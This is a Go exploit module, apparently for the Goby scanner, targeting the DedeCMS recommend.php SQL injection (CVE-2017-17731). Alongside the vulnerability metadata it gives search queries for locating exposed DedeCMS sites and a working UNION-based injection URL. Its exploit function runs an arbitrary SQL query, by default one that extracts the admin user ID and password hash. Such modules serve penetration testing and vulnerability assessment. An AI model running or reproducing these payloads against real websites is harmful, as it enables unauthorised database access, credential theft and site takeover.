package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dedecms recommend.php SQL Injection Vulnerability (CVE-2017-17731)",
    "Description": "<p>Dream Weaving content management system is a well-known PHP open source website management system.</p><p>DedeCMS through 5.7 has SQL Injection via the $_FILES superglobal to plus/recommend.php.</p>",
    "Impact": "<p>Attackers can directly execute SQL statements to control the entire server: get data, modify data, delete data, etc.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://www.dedecms.com/\">http://www.dedecms.com/</a></p>",
    "Product": "DedeCMS",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "Dedecms recommend.php SQL 注入漏洞（CVE-2017-17731）",
            "Product": "DedeCMS",
            "Description": "<p>织梦内容管理系统是知名的 PHP 开源网站管理系统。<br></p><p>DedeCMS 5.7 版本存在利用 $_FILES 全局变量到 plus/recommend.php 的 SQL 注入漏洞。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.dedecms.com/\">http://www.dedecms.com/</a></p>",
            "Impact": "<p>攻击者可以直接执行 SQL 语句，从而控制整个服务器：获取数据、修改数据、删除数据等。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dedecms recommend.php SQL Injection Vulnerability (CVE-2017-17731)",
            "Product": "DedeCMS",
            "Description": "<p>Dream Weaving content management system is a well-known PHP open source website management system.<br></p><p>DedeCMS through 5.7 has SQL Injection via the $_FILES superglobal to plus/recommend.php.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"http://www.dedecms.com/\">http://www.dedecms.com/</a></p>",
            "Impact": "<p>Attackers can directly execute SQL statements to control the entire server: get data, modify data, delete data, etc.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "(body=\"Power by DedeCms\" || (body=\"Powered by\" && body=\"http://www.dedecms.com/\" && body=\"DedeCMS\") || body=\"/templets/default/style/dedecms.css\") || body=\"<div><h3>DedeCMS Error Warning!</h3>\"",
    "GobyQuery": "(body=\"Power by DedeCms\" || (body=\"Powered by\" && body=\"http://www.dedecms.com/\" && body=\"DedeCMS\") || body=\"/templets/default/style/dedecms.css\") || body=\"<div><h3>DedeCMS Error Warning!</h3>\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "http://www.dedecms.com/",
    "DisclosureDate": "2021-06-15",
    "References": [
        "https://github.com/fengxuangit/dede_exp_collect/blob/master/dede_recommend.php_sqli.py"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2017-17731"
    ],
    "CNVD": [
        "CNVD-2018-01088"
    ],
    "CNNVD": [
        "CNNVD-201712-665"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "select CONCAT(0x7c,userid,0x7c,pwd)+from+~#@__admin~ limit+0,1",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "text",
        "content": "返引号替换为~"
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "9.8",
    "PocId": "10217"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,md5(0x0c),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "58c89562f58fd276f592420068db8c09")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/plus/recommend.php"
			cmd := ss.Params["cmd"].(string)
			cmd = strings.Replace(cmd, "~", "`", -1)
			payload := "?action=&aid=1&_FILES[type][tmp_name]=\\' or mid=@`\\'` /*!50000union*//*!50000select*/1,2,3,(" + cmd + "),5,6,7,8,9#@`\\'`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"
			uri = fmt.Sprintf("%s%s", uri, strings.Replace(strings.Replace(payload, " ", "+", -1), "#", "%23", -1))
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "<h2>") {
					expResult.Success = true
					regexp := regexp.MustCompile(`<h2>.*?\|(.*?)</h2>`)
					dbinfo := regexp.FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
					expResult.Output = dbinfo
				}
			}
			return expResult
		},
	))
}
